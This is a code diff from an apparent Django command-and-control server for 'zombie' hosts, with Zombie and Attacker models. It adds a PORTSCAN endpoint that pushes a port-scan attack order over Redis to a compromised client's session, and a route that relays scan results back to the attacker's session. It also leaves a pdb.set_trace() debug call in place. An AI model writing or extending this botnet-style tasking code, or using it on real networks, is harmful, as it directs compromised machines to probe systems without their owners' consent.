@@ -31,7 +31,7 @@ class ZombieConnection(View):
             zom = Zombie.objects.get(host=request.META['HTTP_HOST'])
         except Zombie.DoesNotExist:
             newZombie = Zombie.objects.create(host=request.META['HTTP_HOST'])
-            
+
             redis_publisher = RedisPublisher(facility='attacker',sessions=[Attacker.objects.all()[0].sesskey])
             redis_publisher.publish_message(RedisMessage(simplejson.dumps({'newzombieId':newZombie.pk,'newzombieHost':newZombie.host})))
         if not request.session.exists(request.session.session_key):
@@ -106,14 +106,32 @@ class ZombieControl(viewsets.ModelViewSet):
 
 
         return Response({'ack':'canceled'})
+    @list_route(methods=['post'])
+    def PORTSCAN(self,request,pk=None):
+        target = request.data['targetnet']+":2000"
+        #print(Zombie.objects.all()[0].host)
+        pdb.set_trace()
+        try:
+            redis_publisher = RedisPublisher(facility='solo', sessions=[Zombie.objects.get(host=target).sesskey])
+            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'attacktype':'portscan','attackInfo':{}})))
+        except Zombie.DoesNotExist:
+            return Response({'failed':'failed'})
+
+        return Response({'ack':'portscan'})
+    @list_route(methods=['get'])
+    def responds(self,request,pk=None):
+
+        redis_publisher = RedisPublisher(facility='attacker',sessions=[Attacker.objects.all()[0].sesskey])
+        redis_publisher.publish_message(RedisMessage(simplejson.dumps({'host':request.GET['host']})))
+
+        return HttpResponse()
 
 
 class InjectionCreate(View):
         def post(self,request,**kwargs):
             ip = request.POST['server_ip']
 
-            redis_publisher = RedisPublisher(facility='solo',sessions=[request.session.session_key])
-            redis_publisher.publish_message(RedisMessage(simplejson.dumps({'test':'test'})))
+
 
             #add ws redis
             wsredis = ""
